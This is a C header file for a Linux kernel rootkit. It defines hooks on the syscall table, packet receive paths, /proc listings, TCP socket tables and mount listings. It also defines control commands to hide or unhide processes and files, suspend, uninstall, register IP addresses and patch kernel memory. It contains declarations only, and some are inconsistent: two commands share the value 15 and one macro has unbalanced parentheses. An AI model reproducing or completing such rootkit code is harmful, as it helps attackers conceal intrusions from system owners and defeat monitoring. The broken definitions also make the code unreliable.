#ifndef __DEFS_H
#define __DEFS_H

#include <arch.h>
#include <kdefs.h>

/* rkhook defines */
#define RK_DBG         0
#define RK_SCT         1
#define RK_PKT         2
#define RK_TPK         3
#define RK_RAW         4
#define RK_PID         5
#define RK_TCP         6
#define RK_MNT         7
#define NR_HOOKS       8

#define RKHOOKDR       1
#define DB(x)     (1<<x)

#define RK_PFS (DB(RK_PID)|DB(RK_TCP))
#define RK_SHM (DB(RK_MNT))

#define MODEA ((1<<NR_HOOKS)-2)
#define MODEB 0
#define MODEC (DB(RK_SCT)|DB(RK_PFS)|(DB(RK_SHM))
#define MODED (DB(RK_SCT))

/* rkop defines */
#define RKHPID         1
#define RKUHPID        2
#define RKHFILE        3
#define RKUHFILE       4
#define RKUNINST       5
#define RKUHOOK        6
#define RKSUSP         7
#define RKCONT         8
#define RKVERZ         9
#define RKSTAT        10
#define RKMHOOK       11
#define RKRMUHOOK     12
#define RKSTATHOOK    13
#define RKADDIP4      14
#define RKADDIP6      15
#define RKMEMPATCH    15

#define do_debug             rksyms.fdo_debug
#define vmalloc              rksyms.fvmalloc
#define kmalloc              rksyms.fkmalloc
#define printk               rksyms.fprintk
#define panic                rksyms.fpanic
#define tcp4seqshow          rksyms.ftcp4seqshow
#define tcp6seqshow          rksyms.ftcp6seqshow
#define packet_rcv           rksyms.fpacket_rcv
#define tpacket_rcv          rksyms.ftpacket_rcv
#define raw_rcv              rksyms.fraw_rcv
#define consume_skb          rksyms.fconsume_skb
#define vfs_stat             rksyms.fvfs_stat
#define notify_change        rksyms.notify_change_
#define fnotify_change       rksyms.fnotify_change_
#define kern_path            rksyms.fkern_path
#define spin_lock_irq        rksyms.fspin_lock_irq
#define spin_unlock_irq      rksyms.fspin_unlock_irq
#define flush_icache_range   rksyms.flush_cache_range
#define proc_root_readdir    rksyms.fproc_root_readdir
#define show_vfsmnt          rksyms.fshow_vfsmnt
#define mounts_op            rksyms.dmounts_op
#define tcp4seqinfo          rksyms.dtcp4seqinfo
#define sys_call_table       rksyms.dsys_call_table

/* rksyms */
struct ksyms {
	REGPARM(3) unsigned long (*fdo_debug)(struct pt_regs *regs, long error);
	REGPARM(3) char         *(*fvmalloc)(unsigned long size);
	REGPARM(3) void         *(*fkmalloc)(unsigned long size, int flags);
	REGPARM(3) int           (*fvfs_stat)(char *, struct kstat *);
	REGPARM(3) int           (*fkern_path)(char *, unsigned int, struct path *);
	           int           (*fprintk)(char *fmt, ...);
	REGPARM(3) unsigned long (*fspin_lock_irq)(spinlock_t *lock);
	REGPARM(3) void          (*fspin_unlock_irq)(spinlock_t *, unsigned long);
	REGPARM(3) int           (*fpacket_rcv)(void *,void *,void *,void *);
	REGPARM(3) int           (*ftpacket_rcv)(void *,void *,void *,void *);
	REGPARM(3) int           (*fraw_rcv)(void *,void *);
	REGPARM(3) int           (*ftcp4seqshow)(void *,void *);
	REGPARM(3) int           (*ftcp6seqshow)(void *,void *);
	REGPARM(3) void          (*fconsume_skb)(void *);
	REGPARM(3) int           (*fiterate_dir)(void *file, struct dir_context *ctx);
	REGPARM(3) unsigned long (*fvfree)(void *ptr);
	           void          (*fpanic)(char *fmt, ...);
	REGPARM(3) unsigned long (*fproc_root_readdir)(void *f, void *d, filldir_t fdir);
	REGPARM(3) int           (*fshow_vfsmnt)(struct seq_file *m, void *mnt);
	REGPARM(3) unsigned long (*flush_cache_range)(unsigned long, unsigned long);
	unsigned long            dsys_call_table;
	unsigned long            system_call;
	struct seq_operations   *dtcp4seqinfo;
	struct seq_operations   *dtcp6seqinfo;
	unsigned long            ip_mc_output;
	unsigned long            ipopt;
	unsigned long            current;
	unsigned long            cpu_number;
	unsigned long            num_processors;
	struct seq_operations   *dmounts_op;
	unsigned long            vfs_readdir;
	unsigned long            notify_change_;
	unsigned long            fnotify_change_;
	unsigned long            proc_root_operations;
	unsigned long            handle_sys;
	unsigned long            do_bp;
	unsigned long            secops;
	unsigned long            sectaskgetsched;
};

struct sym {
	char *name;
	unsigned long addr;
};

struct elfarg {
	unsigned long base;
	unsigned char *map;
	int nsyms;
	unsigned int *ebx;
	unsigned int *gotaddr;
	struct sym *syms;
};

/* rkargs */
struct kargs {
	unsigned long spmode;
};

/* rkctl */
struct rkops {
	unsigned int  cmd;
	uint64_t      arg;
};

struct rkip_args {
	unsigned long *ips;
	unsigned int  nips;
};

struct rktrace {
	unsigned long *addr;
	unsigned char bytes[8];
};

struct hook {
    unsigned int addr;
    unsigned char bytes[8];
};
struct rkhook_args {
	struct hook  *segs;
	unsigned long nsegs;
	unsigned int  pid;
};

#endif
